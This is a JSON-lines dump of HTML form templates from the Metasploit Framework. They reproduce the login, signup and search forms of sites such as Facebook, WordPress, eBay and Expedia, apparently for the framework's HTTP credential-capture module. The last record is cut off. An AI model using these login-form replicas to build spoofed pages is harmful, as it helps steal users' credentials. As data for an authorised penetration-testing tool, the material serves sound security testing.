{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.es.txt", "content": "<form name='headerSearch' action='http://search.ebay.es/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"fts\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form><form name='gs'> <input type=\"button\" value=\"\" onclick=\"if(this.form.gs.selectedIndex!=0)location = this.form.gs.options[this.form.gs.selectedIndex].value + '&amp;redir=0';\" /></form>", "timestamp": "2025-10-24T23:40:09.973362"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.fr.txt", "content": "<form name='headerSearch' action='http://search.ebay.fr/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:10.295334"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ebay.it.txt", "content": "<form name='headerSearch' action='http://search.ebay.it/search/search.dll' method='get'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"_trksid\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"satitle\" size=\"60\" class=\"srchfld\" type=\"text\" id=\"satitle\" value=\"\" maxlength=\"300\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:10.653097"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ecademy.com.txt", "content": "<form action='/module.php?mod=search' method='get' style='margin:0px 0px 0px 0px;'> <input name=\"mod\" class=\"searchElements\" type=\"hidden\" value=\"\" /><input name=\"q\" tabindex=\"2\" class=\"searchElements\" id=\"headerSearch\" value=\"\" /><input tabindex=\"2\" class=\"searchElements\" type=\"submit\" value=\"\" /></form><form name='account' action='account.php?op=signup' method='POST' style='margin:0px'> <input name=\"edit[real_email]\" size=\"35\" value=\"\" maxlength=\"128\" /><input name=\"edit[passwd]\" size=\"35\" type=\"password\" value=\"\" maxlength=\"128\" /><input name=\"edit[passwd_2]\" size=\"35\" type=\"password\" value=\"\" maxlength=\"128\" /><input name=\"edit[first_name]\" size=\"35\" value=\"\" maxlength=\"20\" /><input name=\"edit[last_name]\" size=\"35\" value=\"\" maxlength=\"20\" /><input name=\"edit[organization]\" size=\"35\" value=\"\" maxlength=\"128\" /><input name=\"edit[monthlenews]\" checked type=\"checkbox\" value=\"\" /><input name=\"edit[dailenews]\" checked type=\"checkbox\" value=\"\" /><input name=\"edit[read]\" type=\"checkbox\" /><input name=\"op\" type=\"submit\" value=\"\" /><input name=\"edit[hidedirectory]\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:10.977049"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/esnips.com.txt", "content": "<form name='FormMainSignIn' action='/SignInAction.ns;jsessionid=94F7A2CE2E99C9B77574E8487059C338?action=process' method='post' id='FormMainSignIn'> <input name=\"ns_EventTarget\" type=\"hidden\" value=\"\" /><input name=\"ns_EventArgument\" type=\"hidden\" value=\"\" /><input name=\"referrer\" type=\"hidden\" value=\"\" /><input name=\"searchTerm\" size=\"15\" type=\"text\" id=\"txtSearchTerm\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:11.619828"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/espn.go.com.txt", "content": "<form name='searchBox' class='aw_searchForm' action='http://sports.espn.go.com/keyword/search' id='searchBox' method='get'> <input name=\"searchString\" autocomplete=\"off\" class=\"aw_searchInput\" type=\"text\" id=\"searchStr\" /><input name=\"page\" type=\"hidden\" id=\"page\" value=\"\" /><input class=\"aw_searchBtn\" type=\"submit\" src=\"\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:11.957711"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/exblog.jp.txt", "content": "<form name='authform' action='http://regist.excite.co.jp/idcenter/login_req/?pname=blog&brand=xcit&targeturl=http%3A%2F%2Fwww%2Eexblog%2Ejp' method='post' onsubmit='return runAuth(document.authform, this);'> <input name=\"acctname\" class=\"line130\" type=\"text\" value=\"\" maxlength=\"20\" /><input name=\"passwd\" class=\"line130\" type=\"password\" value=\"\" maxlength=\"20\" /><input name=\"ssl\" checked=\"checked\" type=\"checkbox\" value=\"\" /><input class=\"disp\" type=\"submit\" onmouseover=\"logInHover(this);\" id=\"login_submit\" value=\"\" onfocus=\"logInHover(this);\" onmouseout=\"logInOut(this);\" onblur=\"logInOut(this);\" /><input name=\"notktalive\" type=\"hidden\" value=\"\" /></form><form name='search' class='12345' action='http://www.excite.co.jp/exblog/search/' method='get'> <input name=\"q\" size=\"40\" type=\"text\" id=\"search_text\" value=\"\" /><input class=\"disp\" type=\"submit\" onmouseover=\"logInHover(this);\" id=\"search_submit\" value=\"\" onfocus=\"logInHover(this);\" onmouseout=\"logInOut(this);\" onblur=\"logInOut(this);\" /><input name=\"_ie\" type=\"hidden\" value=\"\" /><input name=\"t\" type=\"hidden\" value=\"\" /></form><form action='http://upload.exblog.jp/blog_tool.asp' method='POST' id='trackback_form'> </form><form name='SkinFrm' action='http://www.exblog.jp/adm/chgskin_exec.asp' method='post'> <input name=\"eid\" type=\"hidden\" value=\"\" /><input name=\"eskin\" type=\"hidden\" value=\"\" /><input name=\"esloc\" type=\"hidden\" value=\"\" /><input name=\"esdiv\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:12.316096"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/excite.co.jp.txt", "content": "<form name='search_form' action='http://www.excite.co.jp/search.gw' method='get' id='searchForm'> <input name=\"search\" type=\"text\" id=\"inputSrchBox\" value=\"\" /><input name=\"submit\" class=\"sr_button\" type=\"submit\" value=\"\" /><input name=\"target\" type=\"hidden\" id=\"searchTarget\" value=\"\" /><input name=\"look\" type=\"hidden\" value=\"\" /></form><form name='world' action='http://www.excite.co.jp/world/english/' method='post' target='_top'> <input name=\"wb_lp\" checked type=\"radio\" value=\"\" /><input name=\"wb_lp\" type=\"radio\" value=\"\" /><input name=\"start\" type=\"submit\" value=\"\" /></form><form name='search' action='http://www.excite.co.jp/transfer/search/' method='get' target='_top'> <input name=\"SF\" size=\"15\" type=\"text\" value=\"\" onfocus=\"this.select()\" style=\"width:128px;\" /><input name=\"ST\" size=\"15\" type=\"text\" value=\"\" onfocus=\"this.select()\" style=\"width:128px;\" /><input name=\"time.Y\" type=\"hidden\" value=\"\" /><input name=\"SR\" checked=\"checked\" type=\"radio\" value=\"\" /><input name=\"SR\" type=\"radio\" value=\"\" /><input name=\"submit\" type=\"submit\" value=\"\" /></form><form name='dic_form_mod' action='http://www.excite.co.jp/dictionary/' method='get' target='_top'> <input name=\"search\" size=\"15\" type=\"text\" value=\"\" onfocus=\"this.select()\" style=\"width:280px; margin-top:2px\" /><input name=\"subbtn_dic_enja\" type=\"button\" value=\"\" onclick=\"sub_dic_form('enja')\" style=\"width:40px\" /><input name=\"subbtn_dic_jaen\" type=\"button\" value=\"\" onclick=\"sub_dic_form('jaen')\" style=\"width:40px\" /><input name=\"subbtn_dic_ja\" type=\"button\" value=\"\" onclick=\"sub_dic_form('ja')\" style=\"width:40px\" /><input name=\"subbtn_dic_comp\" type=\"button\" value=\"\" onclick=\"sub_dic_form('comp')\" style=\"width:140px\" /><input name=\"match\" checked type=\"radio\" value=\"\" /><input name=\"match\" type=\"radio\" value=\"\" /><input name=\"match\" type=\"radio\" value=\"\" /><input name=\"_ie\" type=\"hidden\" value=\"\" /><input name=\"dic\" type=\"hidden\" value=\"\" /><input name=\"dictionary\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:12.643224"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/expedia.com.txt", "content": "<form name='Wiz' action='/daily/common/moreinfo.asp' id='Wiz' method='post'> <input name=\"BundleType\" type=\"hidden\" id=\"BundleType\" value=\"\" /><input name=\"WT\" type=\"hidden\" id=\"WT\" value=\"\" /><input name=\"FCity\" type=\"hidden\" id=\"FCity\" value=\"\" /><input name=\"FTLA\" type=\"hidden\" id=\"FTLA\" value=\"\" /><input name=\"TCity\" type=\"hidden\" id=\"TCity\" value=\"\" /><input name=\"TTLA\" type=\"hidden\" id=\"TTLA\" value=\"\" /><input name=\"TCityId\" type=\"hidden\" id=\"TCityId\" value=\"\" /><input name=\"FDate\" type=\"hidden\" id=\"FDate\" value=\"\" /><input name=\"TDate\" type=\"hidden\" id=\"TDate\" value=\"\" /><input name=\"MDate\" type=\"hidden\" id=\"MDate\" value=\"\" /><input name=\"FTime\" type=\"hidden\" id=\"FTime\" value=\"\" /><input name=\"TTime\" type=\"hidden\" id=\"TTime\" value=\"\" /><input name=\"CarC\" type=\"hidden\" id=\"CarC\" value=\"\" /><input name=\"nR\" type=\"hidden\" id=\"nR\" value=\"\" /><input name=\"aRA\" type=\"hidden\" id=\"aRA\" value=\"\" /><input name=\"aRS\" type=\"hidden\" id=\"aRS\" value=\"\" /><input name=\"aRC\" type=\"hidden\" id=\"aRC\" value=\"\" /><input name=\"aRCA\" type=\"hidden\" id=\"aRCA\" value=\"\" /><input name=\"Inf\" type=\"hidden\" id=\"Inf\" value=\"\" /><input name=\"bFlex\" type=\"hidden\" id=\"bFlex\" value=\"\" /><input name=\"TL\" type=\"hidden\" id=\"TL\" value=\"\" /><input name=\"Airline\" type=\"hidden\" id=\"Airline\" value=\"\" /><input name=\"Class\" type=\"hidden\" id=\"Class\" value=\"\" /><input name=\"bNS\" type=\"hidden\" id=\"bNS\" value=\"\" /><input name=\"bCP\" type=\"hidden\" id=\"bCP\" value=\"\" /><input name=\"md\" type=\"hidden\" id=\"md\" value=\"\" /><input name=\"aFCity\" type=\"hidden\" id=\"aFCity\" value=\"\" /><input name=\"aTCity\" type=\"hidden\" id=\"aTCity\" value=\"\" /><input name=\"aFDate\" type=\"hidden\" id=\"aFDate\" value=\"\" /><input name=\"aFTime\" type=\"hidden\" id=\"aFTime\" value=\"\" /><input name=\"Street\" type=\"hidden\" id=\"Street\" value=\"\" /><input name=\"TCity1\" type=\"hidden\" id=\"TCity1\" value=\"\" /><input name=\"State\" type=\"hidden\" id=\"State\" value=\"\" /><input name=\"Zip\" type=\"hidden\" id=\"Zip\" value=\"\" /><input name=\"HName\" type=\"hidden\" id=\"HName\" value=\"\" /><input name=\"StarR\" type=\"hidden\" id=\"StarR\" value=\"\" /><input name=\"TCityD\" type=\"hidden\" id=\"TCityD\" value=\"\" /><input name=\"Radius\" type=\"hidden\" id=\"Radius\" value=\"\" /><input name=\"Vendor\" type=\"hidden\" id=\"Vendor\" value=\"\" /><input name=\"DC\" type=\"hidden\" id=\"DC\" value=\"\" /><input name=\"CorpC\" type=\"hidden\" id=\"CorpC\" value=\"\" /><input name=\"CoupC\" type=\"hidden\" id=\"CoupC\" value=\"\" /><input name=\"RateC\" type=\"hidden\" id=\"RateC\" value=\"\" /><input name=\"OtherC\" type=\"hidden\" id=\"OtherC\" value=\"\" /><input name=\"Equipment\" type=\"hidden\" id=\"Equipment\" value=\"\" /><input name=\"Cruiseline\" type=\"hidden\" id=\"Cruiseline\" value=\"\" /><input name=\"StarRC\" type=\"hidden\" id=\"StarRC\" value=\"\" /><input name=\"ro\" type=\"hidden\" id=\"ro\" value=\"\" /><input name=\"bSE\" type=\"hidden\" id=\"bSE\" value=\"\" /><input name=\"bPC\" type=\"hidden\" id=\"bPC\" value=\"\" /><input name=\"PC\" type=\"hidden\" id=\"PC\" value=\"\" /><input name=\"CLength\" type=\"hidden\" id=\"CLength\" value=\"\" /><input name=\"Port\" type=\"hidden\" id=\"Port\" value=\"\" /><input name=\"Recidency\" type=\"hidden\" id=\"Recidency\" value=\"\" /><input name=\"Ship\" type=\"hidden\" id=\"Ship\" value=\"\" /><input name=\"PFDate\" type=\"hidden\" id=\"PFDate\" value=\"\" /><input name=\"PTDate\" type=\"hidden\" id=\"PTDate\" value=\"\" /><input name=\"bPart\" type=\"hidden\" id=\"bPart\" value=\"\" /><input name=\"tciAct\" type=\"hidden\" id=\"tciAct\" value=\"\" /><input name=\"ao\" type=\"hidden\" id=\"ao\" value=\"\" /><input name=\"SType\" type=\"hidden\" id=\"SType\" value=\"\" /><input name=\"bIE6\" type=\"hidden\" id=\"bIE6\" value=\"\" /><input name=\"CalS\" type=\"hidden\" id=\"CalS\" value=\"\" /><input name=\"CalE\" type=\"hidden\" id=\"CalE\" value=\"\" /><input name=\"LsFlightOrigTLA\" type=\"hidden\" id=\"LsFlightOrigTLA\" value=\"\" /><input name=\"LsFlightOrigName\" type=\"hidden\" id=\"LsFlightOrigName\" value=\"\" /><input name=\"LsFlightDestTLA\" type=\"hidden\" id=\"LsFlightDestTLA\" value=\"\" /><input name=\"LsFlightDestName\" type=\"hidden\" id=\"LsFlightDestName\" value=\"\" /><input name=\"LsHotel\" type=\"hidden\" id=\"LsHotel\" value=\"\" /><input name=\"LsAtlas\" type=\"hidden\" id=\"LsAtlas\" value=\"\" /><input name=\"LsAtlasRegionId\" type=\"hidden\" id=\"LsAtlasRegionId\" value=\"\" /><input name=\"LsFOverride\" type=\"hidden\" id=\"LsFOverride\" value=\"\" /><input name=\"LsTOverride\" type=\"hidden\" id=\"LsTOverride\" value=\"\" /><input name=\"srch\" checked=\"checked\" class=\"Wr\" type=\"radio\" id=\"r1\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r2\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r3\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r8\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r9\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r4\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r7\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r5\" value=\"\" /><input name=\"srch\" class=\"Wr\" type=\"radio\" id=\"r6\" value=\"\" /></form><form name='ec' action='/daily/home/ec.asp' id='ec' method='post'> <input name=\"email\" class=\"input-t\" type=\"text\" id=\"email\" value=\"\" onfocus=\"this.select();\" maxlength=\"128\" /><input name=\"hair\" autocomplete=\"off\" class=\"input-b\" type=\"text\" id=\"hair\" value=\"\" onfocus=\"this.select();\" maxlength=\"100\" /><input name=\"hTLA1\" type=\"hidden\" id=\"hTLA1\" /></form>", "timestamp": "2025-10-24T23:40:12.969278"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ezinearticles.com.txt", "content": "<form action='http://EzineArticles.com/results/' method='get' target='_top'> <input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"40\" type=\"text\" value=\"\" maxlength=\"255\" /><input name=\"sa\" type=\"submit\" value=\"\" /><input name=\"sitesearch\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"forid\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"flav\" type=\"hidden\" value=\"\" /><input name=\"sig\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /></form><form name='login' action='http://members.ezinearticles.com/' method='post'> <input name=\"email\" class=\"copyright\" type=\"text\" id=\"email\" value=\"\" maxlength=\"80\" /><input name=\"pass\" size=\"\" class=\"copyright\" type=\"password\" id=\"pass\" value=\"\" maxlength=\"80\" /><input name=\"submit\" class=\"copyright\" type=\"submit\" value=\"\" onclick=\"chgfield()\" /><input name=\"jscheck\" type=\"hidden\" value=\"\" /></form><form action='/' method='post'> <input name=\"stxt\" size=\"25\" class=\"nvinput\" type=\"text\" value=\"\" /><input name=\"Search\" class=\"copyright\" type=\"submit\" value=\"\" /><input name=\"act\" type=\"hidden\" value=\"\" /></form><form action='http://lists.permissionbasedemail.com/subscribe/subscribe.tml' method='GET'> <input name=\"list\" type=\"hidden\" value=\"\" /><input name=\"confirm\" type=\"hidden\" value=\"\" /><input name=\"url\" type=\"hidden\" value=\"\" /><input name=\"email\" size=\"25\" class=\"nvinput\" type=\"text\" value=\"\" /><input name=\"name\" size=\"25\" class=\"nvinput\" type=\"text\" value=\"\" maxlength=\"100\" /><input name=\"subscribe\" title=\"Subscribe\" type=\"image\" src=\"/images/button_subscribe.gif\" border=\"0\" height=\"17\" alt=\"Subscribe\" width=\"59\" /></form>", "timestamp": "2025-10-24T23:40:13.304183"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/facebook.com.txt", "content": "<form name='loginform' action='https://login.facebook.com/login.php' method='post' id='loginform'> <input name=\"challenge\" type=\"hidden\" id=\"challenge\" value=\"\" /><input name=\"md5pass\" type=\"hidden\" id=\"md5pass\" value=\"\" /><input name=\"noerror\" type=\"hidden\" id=\"noerror\" value=\"\" /><input name=\"email\" size=\"20\" class=\"inputtext\" onkeypress=\"login_form_change()\" type=\"text\" id=\"email\" value=\"\" /><input name=\"pass\" size=\"20\" class=\"inputtext\" type=\"password\" id=\"pass\" /><input name=\"persistent\" class=\"inputcheckbox\" type=\"checkbox\" id=\"persistent_inputcheckbox\" value=\"\" /><input name=\"doquicklogin\" class=\"inputsubmit\" type=\"submit\" id=\"doquicklogin\" value=\"\" onclick=\"this.disabled=true; this.form.submit(); return false;\" /><input name=\"charset_test\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:13.632830"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fanfiction.net.txt", "content": "<form name='tox_dictionary' action='/dictionary.php' method='get' target='_blank'> <input name=\"word\" size=\"20\" title=\"word input\" type=\"text\" id=\"word\" value=\"\" maxlength=\"75\" /><input type=\"submit\" value=\"\" /></form><form name='topx_search' action='/search.php' method='get'> <input name=\"plus_keywords\" size=\"20\" title=\"Search with these keywords/phrases\" type=\"text\" id=\"keyword\" value=\"\" maxlength=\"50\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:13.978722"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fc2.com.txt", "content": "<form name='form_login' action='https://secure.id.fc2.com/index.php?mode=login' method='post' onsubmit='return login_form_check()'> <input name=\"email\" size=\"18\" type=\"text\" id=\"email\" value=\"\" maxlength=\"80\" /><input name=\"pass\" size=\"16\" type=\"password\" id=\"pass\" maxlength=\"16\" /><input name=\"save_email\" type=\"checkbox\" value=\"\" /><input name=\"hdn_save_email\" type=\"hidden\" value=\"\" /><input type=\"image\" src=\"image/login.gif\" value=\"\" height=\"30\" width=\"88\" /></form>", "timestamp": "2025-10-24T23:40:14.307460"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fc2web.com.txt", "content": "<form action='http://cgiserv01.fc2web.com/cgi-bin/hps.cgi' method='post'> <input name=\"username\" size=\"15\" class=\"normal1\" /><input name=\"password\" size=\"12\" class=\"text\" type=\"password\" /><input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"text12px\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:14.620657"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/filefactory.com.txt", "content": "<form name='login' action='/index.php' method='POST'> <input name=\"email\" size=\"12\" type=\"text\" /><input name=\"password\" size=\"12\" type=\"password\" /><input name=\"login\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:14.935449"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/filefront.com.txt", "content": "<form name='loginForm' action='http://signup.filefront.com/' method='post'> <input name=\"uploadID\" type=\"hidden\" id=\"uploadID\" value=\"\" /><input name=\"existingUser\" type=\"hidden\" id=\"existingUser\" value=\"\" /><input name=\"redirectTo\" type=\"hidden\" id=\"redirectTo\" value=\"\" /><input name=\"pageID\" type=\"hidden\" id=\"pageID\" value=\"\" /><input name=\"loginUser\" class=\"inputText\" type=\"text\" id=\"loginUser\" value=\"\" onfocus=\"if (value == 'Username') {value =''}\" onblur=\"if (value == '') {value = 'Username'} else {var newValue; newValue = value.replace(' ', ''); if(newValue != value) {alert('Please enter your username without any spaces.');}}\" /><input name=\"loginPass\" class=\"inputText\" type=\"password\" id=\"loginPass\" value=\"\" onfocus=\"if (value == 'password') {value=''}\" onblur=\"if (value == '') {value = 'password'}\" /><input class=\"inputButton\" type=\"image\" src=\"\" /></form><form name='form_search' action='http://search.filefront.com/' method='post'> <input name=\"search\" class=\"searchForm\" /><input type=\"image\" src=\"\" height=\"15\" alt=\"submit search\" width=\"45\" /></form><form name='form_upload' enctype='multipart/form-data' action='http://fileupload4.filefront.com/' method='post'> <input name=\"UPLOAD_IDENTIFIER\" type=\"hidden\" value=\"\" /><input name=\"FL\" type=\"hidden\" value=\"\" /><input name=\"upload\" type=\"hidden\" value=\"\" /><input name=\"game\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:15.268059"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/files.wordpress.com.txt", "content": "<form action='http://en.search.wordpress.com/' method='get' id='head-search'> <input name=\"q\" class=\"text\" type=\"text\" id=\"q\" value=\"\" onfocus=\"this.value=(this.value=='Search WordPress.com Blogs') ? '' : this.value;\" maxlength=\"150\" onblur=\"this.value=(this.value=='') ? 'Search WordPress.com Blogs' : this.value;\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form name='language' action='' id='language'> </form><form name='loginform' action='https://wordpress.com/wp-login.php' id='loginform' method='post'> <input name=\"log\" tabindex=\"1\" type=\"text\" id=\"user_login\" value=\"\" /><input name=\"pwd\" tabindex=\"2\" type=\"password\" id=\"user_pass\" value=\"\" /><input name=\"rememberme\" tabindex=\"3\" type=\"checkbox\" id=\"rememberme\" value=\"\" /><input name=\"testcookie\" type=\"hidden\" id=\"testcookie\" value=\"\" /><input name=\"redirect_to\" type=\"hidden\" id=\"redirect_to\" value=\"\" /><input name=\"submit\" tabindex=\"4\" type=\"submit\" id=\"login-form\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:15.583416"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fling.com.txt", "content": "<form name='login_form' action='/main.php?prg=1&id=noadvert&pg=1' method='post' id='login_form'> <input name=\"a\" type=\"hidden\" value=\"\" /><input name=\"process\" type=\"hidden\" value=\"\" /><input name=\"io_bb\" type=\"hidden\" id=\"io_bb\" value=\"\" /><input name=\"email\" class=\"fr txt\" type=\"text\" /><input name=\"password\" class=\"fr txt\" type=\"password\" /><input name=\"login_submit\" class=\"btn-white-sm\" type=\"submit\" id=\"login_submit\" value=\"\" /><input name=\"remember_me\" type=\"checkbox\" /></form><form name='search_form' action='/search_bridge.php' method='GET' id='search_form'> <input name=\"a\" type=\"hidden\" value=\"\" /><input name=\"pg\" type=\"hidden\" value=\"\" /><input name=\"g\" type=\"hidden\" value=\"\" /><input name=\"prg\" type=\"hidden\" value=\"\" /><input name=\"id\" type=\"hidden\" value=\"\" /><input name=\"location_id\" type=\"text\" id=\"location_id\" value=\"\" style=\"width: 195px;\" /><input name=\"city_name\" type=\"text\" id=\"city_name\" value=\"\" style=\"width: 195px;\" /><input type=\"image\" src=\"\" alt=\"Search millions of real men, women, couples, and swingers looking for sex, dating, fantasies, and free amateur video webcam porn.\" /></form>", "timestamp": "2025-10-24T23:40:16.226998"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/flixster.com.txt", "content": "<form name='navSearch' action='/movies.do' id='navSearch' method='get'> <input name=\"movieAction\" type=\"hidden\" value=\"\" /><input name=\"search\" type=\"text\" id=\"navSearchText\" value=\"\" /><input type=\"image\" src=\"/static/images/buttons/search.gif\" /></form><form name='showtimesForm' action='/showtimes' id='showtimesForm' method='get'> <input name=\"zip\" type=\"text\" id=\"zip\" value=\"\" /><input name=\"submitBtn\" class=\"button\" type=\"submit\" value=\"\" /><input name=\"country\" type=\"hidden\" value=\"\" /></form><form name='loginForm' action='/userAuth.do' id='loginForm' method='post'> <input name=\"userauthAction\" type=\"hidden\" value=\"\" /><input name=\"userauthEmail\" type=\"text\" id=\"userauthEmail\" value=\"\" maxlength=\"100\" /><input name=\"userauthPassword\" type=\"password\" id=\"userauthPassword\" value=\"\" maxlength=\"100\" /><input name=\"userauthRemember\" checked=\"checked\" type=\"checkbox\" id=\"rememberMe\" /><input name=\"submit\" size=\"20\" type=\"submit\" id=\"loginBtn\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:16.551709"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/forbes.com.txt", "content": "<form> </form><form action='http://finapps.forbes.com/finapps/jsp/finance/compinfo/CIAtAGlance.jsp' method='post'> <input name=\"tkr\" size=\"5\" type=\"text\" /><input type=\"submit\" value=\"\" /></form><form name='peopleForm' action='http://www.forbes.com/peopletracker/results.jhtml' method='get'> <input name=\"name\" size=\"20\" type=\"text\" value=\"\" /><input name=\"ticker\" size=\"6\" type=\"text\" value=\"\" /><input type=\"submit\" id=\"search\" value=\"\" /></form><form name='orgChartWikiForm' action='http://orgchart.forbes.com/search' method='get'> <input name=\"company\" class=\"orgChartInput\" type=\"text\" value=\"\" /><input class=\"orgChartButton\" type=\"submit\" value=\"\" /><input name=\"people\" class=\"orgChartInput\" type=\"text\" value=\"\" /><input class=\"orgChartButton\" type=\"submit\" value=\"\" /></form><form action='http://www.investopedia.com/search/results.aspx?index=dictionary' method='get'> <input name=\"index\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"15\" type=\"text\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:17.214149"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fotka.pl.txt", "content": "<form action='szukaj.php' method='post' onsubmit='$(#form_szukaj).attr(disabled, true);' style='margin:0px;'> <input name=\"f[plec]\" checked=\"checked\" type=\"radio\" id=\"f_plec_k\" value=\"\" /><input name=\"f[plec]\" type=\"radio\" id=\"f_plec_m\" value=\"\" /><input name=\"f[miejscowosc_id]\" type=\"hidden\" id=\"f_miejscowosc_id\" value=\"\" /><input name=\"f[miejscowosc]\" size=\"40\" autocomplete=\"off\" type=\"text\" id=\"f_miejscowosc\" value=\"\" style=\"width:130px;\" maxlength=\"30\" /><input name=\"e\" type=\"hidden\" value=\"\" /><input type=\"submit\" id=\"form_szukaj\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:17.661865"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/fotolog.net.txt", "content": "<form name='searchform' action='http://search.fotolog.com/results' method='get' onsubmit='if (!this.q.value) return false;'> <input name=\"type\" checked type=\"radio\" id=\"searchsite\" value=\"\" /><input name=\"type\" type=\"radio\" id=\"searchweb\" value=\"\" /><input name=\"q\" type=\"text\" value=\"\" /></form><form action='http://account.fotolog.com/login' id='login_form' method='post'> <input name=\"redirect\" type=\"hidden\" value=\"\" /><input name=\"u_name\" type=\"text\" value=\"\" maxlength=\"16\" /><input name=\"p_word\" type=\"password\" /></form><form> </form>", "timestamp": "2025-10-24T23:40:17.991573"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/foxnews.com.txt", "content": "<form class='form_1' action='http://search2.foxnews.com/search' method='get' id='search_form'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"getfields\" type=\"hidden\" value=\"\" /><input name=\"filter\" type=\"hidden\" value=\"\" /><input name=\"sort\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"50\" class=\"search_input no_spon\" type=\"text\" id=\"sponsor_searchinput1\" value=\"\" /><input class=\"submit\" type=\"submit\" /></form><form action='http://www.foxbusiness.com/research.html' method='get'> <input name=\"searchString\" type=\"text\" /></form><form class='form_1 no_spon' action='http://search2.foxnews.com/search' method='get' id='footer_search_form' onsubmit='return searchSub(document.searchForm);'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"getfields\" type=\"hidden\" value=\"\" /><input name=\"filter\" type=\"hidden\" value=\"\" /><input name=\"sort\" type=\"hidden\" value=\"\" /><input name=\"entsp\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"50\" class=\"search_input 